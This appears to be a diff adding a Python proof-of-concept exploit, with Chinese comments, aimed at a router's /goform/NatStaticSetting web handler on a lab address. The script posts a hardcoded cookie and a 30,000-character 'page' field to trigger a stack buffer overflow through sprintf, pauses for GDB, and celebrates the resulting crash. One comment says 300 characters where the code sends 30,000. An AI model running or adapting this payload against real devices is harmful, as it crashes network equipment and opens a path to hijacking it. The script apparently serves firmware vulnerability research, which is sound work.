@@ -1,0 +1,30 @@
+import requests
+from pwn import *
+
+ip = '192.168.252.136'
+# 填入你在 IDA 里找到的真实接口名字
+url = f'http://{ip}/goform/NatStaticSetting' 
+
+# 你的合法通行证 Cookie
+cookies = {"password": "recmji"}
+
+# 极简 Payload：除了保证走到 sprintf 的参数，其他全用来轰炸 page
+payload = {
+    "entrys": "1", # 随便给个值，满足 websGetVar
+    "op": "no",    # 随便给个值
+    # 核爆点：发送 300 个 'A'，绝对撑爆 256 字节的 gotopage
+    "page": "A" * 30000
+}
+
+pause() # 等待你在终端附加 GDB
+
+try:
+    print(f"[*] 发送致命 Payload 到 {url}...")
+    res = requests.post(url=url, cookies=cookies, data=payload, timeout=3)
+    print("[-] 竟然没崩？响应:", res.text)
+except requests.exceptions.ConnectionError:
+    print("\n[+] 💥 目标已击毁！连接被强行切断！")
+    print("[+] 完美触发栈溢出崩溃 (SIGSEGV)！")
+    print("[+] 快去 GDB 里看你的 PC 寄存器吧！")
+except requests.exceptions.ReadTimeout:
+    print("\n[+] 请求超时！进程挂起。")
